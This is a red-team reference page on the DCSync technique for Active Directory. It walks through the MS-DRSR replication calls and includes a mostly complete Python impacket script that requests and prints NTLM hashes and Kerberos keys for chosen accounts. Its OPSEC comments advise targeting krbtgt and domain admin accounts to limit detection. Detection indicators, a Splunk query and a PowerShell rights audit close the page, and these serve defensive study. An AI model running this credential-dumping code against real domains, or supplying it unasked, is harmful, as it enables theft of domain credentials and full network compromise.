# DCSync Internals

**MITRE ATT&CK**: [T1003.006 - OS Credential Dumping: DCSync](https://attack.mitre.org/techniques/T1003/006/)

> **Authorized security testing only.** These code patterns are reference material for red team professionals operating under explicit written authorization.

## Overview

DCSync abuses the AD replication protocol (MS-DRSR) to request credential data
directly from a Domain Controller. The attacker impersonates a replication partner
and asks the DC to replicate specific objects -- including password hashes.

Requires **DS-Replication-Get-Changes** + **DS-Replication-Get-Changes-All** extended
rights on the domain NC. Default holders: Domain Admins, Enterprise Admins, DCs.

This is a **high-privilege, high-detection-risk** technique. Replication from a
non-DC host is highly anomalous and readily detected by mature SOCs.

## MS-DRSR Replication Protocol

```
 Attacker (replication rights)          Domain Controller
 ============================           ==================
          |  1. EPM: map DRSUAPI endpoint       |
          |  (port 135 -> dynamic port)         |
          |------------------------------------>|
          |  2. IDL_DRSBind (DRS handle)        |
          |------------------------------------>|
          |  3. IDL_DRSCrackNames              |
          |  (resolve user -> GUID/DN)          |
          |------------------------------------>|
          |  4. IDL_DRSGetNCChanges             |
          |  (request replication of object)    |
          |------------------------------------>|
          |  5. Replicated data returned        |
          |  (encrypted password attributes)    |
          |<------------------------------------|
          |  6. Decrypt with DRS session key    |
```

## Required Privileges

```
 Domain NC (DC=corp,DC=local) Security Descriptor:

 ACE: DS-Replication-Get-Changes (GUID: 1131f6aa-...)
   -> Read replicated attribute values
   Default: Domain Admins, Enterprise Admins, SYSTEM, DCs

 ACE: DS-Replication-Get-Changes-All (GUID: 1131f6ad-...)
   -> Read SECRET and RODC-filtered attributes (password hashes)
   Default: Domain Admins, Enterprise Admins, DCs

 Both required. "Get-Changes" alone returns attributes but NOT hashes.
```

## RPC Transport

```
 1. Endpoint Mapper (TCP/135) -> DRSUAPI UUID e3514235-4b06-11d1-ab04-00c04fc2dcd2
 2. EPM returns dynamic port (49152-65535) for ncacn_ip_tcp
 3. Bind to DRSUAPI with NTLM/Kerberos + RPC packet privacy

 DETECTION: RPC to DRSUAPI from a non-DC IP is the single strongest DCSync indicator.
```

## DRSGetNCChanges C Structures

```c
/*
 * Key MS-DRSR structures for the IDL_DRSGetNCChanges RPC call.
 * Reference: [MS-DRSR] Section 4.1.10
 */

/* Request -- what the attacker sends */
typedef struct _DRS_MSG_GETCHGREQ_V8 {
    UUID            uuidDsaObjDest;      /* Destination DSA GUID */
    UUID            uuidInvocIdSrc;      /* Source invocation ID */
    DSNAME         *pNC;                 /* Target: user DN (targeted) or domain root (full) */
    USN_VECTOR      usnvecFrom;          /* Replication cursor (0 = from start) */
    UPTODATE_VECTOR_V1_EXT *pUpToDateVecDest;
    ULONG           ulFlags;             /* DRS_INIT_SYNC|DRS_WRIT_REP|DRS_NEVER_SYNCED|... */
    ULONG           cMaxObjects;         /* 1 for targeted, higher for bulk */
    ULONG           cMaxBytes;
    ULONG           ulExtendedOp;        /* EXOP_REPL_OBJ(5) or EXOP_REPL_SECRETS(6) */
    ULARGE_INTEGER  liFsmoInfo;
    PARTIAL_ATTR_VECTOR_V1_EXT *pPartialAttrSet;
    PARTIAL_ATTR_VECTOR_V1_EXT *pPartialAttrSetEx;
    SCHEMA_PREFIX_TABLE PrefixTableDest;
} DRS_MSG_GETCHGREQ_V8;

/* Response -- contains replicated data including encrypted password attrs */
typedef struct _DRS_MSG_GETCHGREPLY_V6 {
    UUID            uuidDsaObjSrc;
    UUID            uuidInvocIdSrc;
    DSNAME         *pNC;
    USN_VECTOR      usnvecFrom, usnvecTo;
    UPTODATE_VECTOR_V2_EXT *pUpToDateVecSrc;
    SCHEMA_PREFIX_TABLE PrefixTableSrc;
    ULONG           ulExtendedRet;
    ULONG           cNumObjects;
    ULONG           cNumBytes;
    REPLENTINFLIST *pObjects;            /* ATTRBLOCK with unicodePwd, ntPwdHistory,
                                          * lmPwdHistory, supplementalCredentials
                                          * -- all encrypted with session key */
    BOOL            fMoreData;
    ULONG           cNumNcSizeObjects, cNumNcSizeValues;
} DRS_MSG_GETCHGREPLY_V6;

/*
 * Password attributes in replicated data:
 * 589914  unicodePwd              NTLM hash (MD4 of password)
 * 590689  ntPwdHistory            Previous NTLM hashes
 * 590690  lmPwdHistory            Previous LM hashes
 * 590443  supplementalCredentials Kerberos keys, WDigest, etc.
 * All encrypted with DRS session key from DRSBind.
 */
```

## Python: DCSync Replication Flow

```python
"""
DETECTION: Event 4662 (DS-Replication access rights); DRSUAPI RPC from non-DC IP;
  Directory Service event 2889 (unsigned LDAP bind). Each DRSGetNCChanges = one 4662.
OPSEC: DCSync from non-DC is HIGHLY anomalous. Target specific accounts (krbtgt, DA)
  rather than full dump. Even targeted generates 4662 per object.
"""
from impacket.dcerpc.v5 import drsuapi, transport, epm
from impacket.dcerpc.v5.dtypes import NULL

def dcsync_user(dc_ip, domain, username, password, target_user):
    """Replicate a single user's credentials via MS-DRSR.
    OPSEC: Target krbtgt/DA accounts. Each call = Event 4662 + network evidence."""

    # Step 1: Endpoint Mapper -> DRSUAPI dynamic port
    # DETECTION: DRSUAPI binding from non-DC is anomalous
    string_binding = epm.hept_map(
        dc_ip, drsuapi.MSRPC_UUID_DRSUAPI, protocol="ncacn_ip_tcp")
    rpc_transport = transport.DCERPCTransportFactory(string_binding)
    rpc_transport.set_credentials(username, password, domain)
    dce = rpc_transport.get_dce_rpc()
    dce.set_auth_level(6)  # RPC_C_AUTHN_LEVEL_PKT_PRIVACY
    dce.connect()
    dce.bind(drsuapi.MSRPC_UUID_DRSUAPI)

    # Step 2: DRSBind -- establish replication handle
    # DETECTION: Logged as part of RPC session; capabilities negotiated here
    request = drsuapi.DRSBind()
    request["puuidClientDsa"] = drsuapi.NTDSAPI_CLIENT_GUID
    drs_ext = drsuapi.DRS_EXTENSIONS_INT()
    drs_ext["cb"] = 28
    drs_ext["dwFlags"] = (drsuapi.DRS_EXT_GETCHGREQ_V6 |
                          drsuapi.DRS_EXT_GETCHGREPLY_V6 |
                          drsuapi.DRS_EXT_STRONG_ENCRYPTION)
    request["pextClient"]["cb"] = len(drs_ext)
    request["pextClient"]["rgb"] = list(drs_ext.getData())
    resp = dce.request(request)
    drs_handle = resp["phDrs"]

    # Step 3: DRSCrackNames -- resolve target username to GUID
    crack_req = drsuapi.DRSCrackNames()
    crack_req["hDrs"] = drs_handle
    crack_req["dwInVersion"] = 1
    crack_body = drsuapi.DRS_MSG_CRACKREQ_V1()
    crack_body["CodePage"] = 0
    crack_body["LocaleId"] = 0
    crack_body["formatOffered"] = drsuapi.DS_NT4_ACCOUNT_NAME_SANS_DOMAIN
    crack_body["formatDesired"] = drsuapi.DS_UNIQUE_ID_NAME
    crack_body["cNames"] = 1
    crack_body["rpNames"].append(target_user)
    crack_req["pmsgIn"]["V1"] = crack_body
    crack_resp = dce.request(crack_req)
    target_guid = crack_resp["pmsgOut"]["V1"]["pResult"]["rItems"][0]["pName"]

    # Step 4: DRSGetNCChanges -- THE CRITICAL CALL
    # DETECTION: Event 4662 with Property {1131f6ad-...} (Get-Changes-All)
    # OPSEC: cMaxObjects=1 for targeted; EXOP_REPL_SECRETS(6) for password data
    nc_req = drsuapi.DRSGetNCChanges()
    nc_req["hDrs"] = drs_handle
    nc_req["dwInVersion"] = 8
    nc_body = drsuapi.DRS_MSG_GETCHGREQ_V8()
    nc_body["uuidDsaObjDest"] = drsuapi.NTDSAPI_CLIENT_GUID
    nc_body["uuidInvocIdSrc"] = drsuapi.NTDSAPI_CLIENT_GUID
    dsname = drsuapi.DSNAME()
    dsname["SidLen"] = 0
    dsname["Guid"] = target_guid
    dsname["StringName"] = NULL
    nc_body["pNC"] = dsname
    nc_body["usnvecFrom"]["usnHighObjUpdate"] = 0
    nc_body["usnvecFrom"]["usnHighPropUpdate"] = 0
    nc_body["ulExtendedOp"] = 6  # EXOP_REPL_SECRETS
    nc_req["pmsgIn"]["V8"] = nc_body
    nc_resp = dce.request(nc_req)

    # Step 5: Parse replicated attributes (local -- no further events)
    reply = nc_resp["pmsgOut"]["V6"]
    for attr in iterate_attributes(reply["pObjects"]):
        if attr["attrTyp"] == 589914:  # unicodePwd = NTLM hash
            encrypted = attr["AttrVal"]["pAVal"][0]["pVal"]
            ntlm_hash = decrypt_attribute(encrypted, drs_handle)
            print(f"[+] NTLM: {target_user} -> {ntlm_hash.hex()}")
        elif attr["attrTyp"] == 590443:  # supplementalCredentials
            print(f"[+] Supplemental credentials (Kerberos keys, WDigest) extracted")
    dce.disconnect()
```

## Targeted vs Full Replication

```
 Targeted (preferred OPSEC):              Full Domain (noisy):
 - Specific user GUIDs                    - Entire domain NC
 - EXOP_REPL_SECRETS, cMaxObjects=1       - pNC = domain root, high cMaxObjects
 - 1 Event 4662 per target                - 4662 for EVERY object
 - Minimal traffic                        - Massive traffic (entire NTDS.dit)
 - Priority: krbtgt, DA accounts          - Source IP = non-DC is the giveaway
```

## Detection Indicators

| Indicator | Source | Details |
|---|---|---|
| Event 4662 | Security log (DC) | Replication property GUIDs 1131f6aa-..., 1131f6ad-... |
| Non-DC replication | Network/DC logs | DRSUAPI RPC from non-Domain Controller IP |
| Account anomaly | Event 4662 | Replication by non-machine account (no trailing $) |
| Directory Svc 2889 | DS log (DC) | LDAP bind without signing |
| RPC mapping | Network | EPM query for DRSUAPI UUID from non-DC |
| Volume anomaly | Network | Large DRSUAPI transfer from DC to non-DC |

```
index=wineventlog EventCode=4662
  Properties="*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*"
| where NOT match(Account_Name, "\$$")
| stats count by Account_Name, src_ip
```

**Proactive defense:**
```powershell
# Audit principals with replication rights
(Get-Acl "AD:DC=corp,DC=local").Access |
    Where-Object {
        $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or
        $_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
    } | Select-Object IdentityReference, ActiveDirectoryRights
```

## Cross-References

- [Kerberos Attacks Narrative](../../12-active-directory-deep-dive/kerberos-attacks.md) -- krbtgt hash enables Golden Ticket
- [Credential Access Overview](../../12-active-directory-deep-dive/credential-access.md) -- DCSync in credential dumping landscape
- [AD Persistence](../../12-active-directory-deep-dive/ad-persistence.md) -- granted replication rights as persistence
- [Kerberoasting Implementation](kerberoasting-implementation.md) -- lower-privilege credential access alternative
